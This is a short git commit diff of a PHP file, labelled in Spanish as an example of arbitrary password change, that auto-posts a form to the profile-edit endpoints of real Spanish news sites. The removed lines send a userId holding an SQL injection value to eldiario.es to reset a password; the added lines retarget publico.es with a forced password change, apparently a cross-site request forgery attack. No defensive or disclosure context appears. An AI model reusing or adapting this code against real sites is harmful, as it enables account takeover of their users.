5bcae03a197aea689fadf8be232c641b1e670210
David Martin Cervero <mcdave91@gmail.com>
2014-04-28 15:04:45 +0200

    Cambio

--- example.php
+++ example.php
@@ -2,23 +2,10 @@
 	require('class.executePhoto.php');
 
 	// Ejemplo de ejecución arbitraria cambio contraseña:
- 	$param = array('avatar'  		=> '',
- 				   'bornDateYear'  	=> '',
- 				   'ediAddress'  	=> '',
- 				   'ediBio'  		=> '',
- 				   'ediCountryCode' => 'ES',
- 				   'ediProvince'  	=> '',
- 				   'ediCity'  		=> '',
- 				   'ediURL'  		=> '',
- 				   'ediZipCode'  	=> '',
- 				   'name'  			=> 'David',
- 				   'newsletter'  	=> '',
- 				   'newsletters'  	=> '',
- 				   'password'  		=> '123456',
- 				   'repeatpassword' => '123456',
- 				   'sex'  			=> '',
-				   'surname'		=> 'Martin',
-				   'userId'			=> '29307\' and \'1\'=\'1');
+ 	$param = array('password'	=> '123456',
+ 				   'repassword'	=> '123456',
+ 				   'url'  		=> '',
+ 				   'avatar'		=> '');
 
-	executePhoto::redirect_post('https://seguro.eldiario.es/usuarios/editar-perfil.json', $param);
+	executePhoto::redirect_post('https://secure.publico.es/comunidad/editar-perfil/do_editar.php', $param);
 ?>
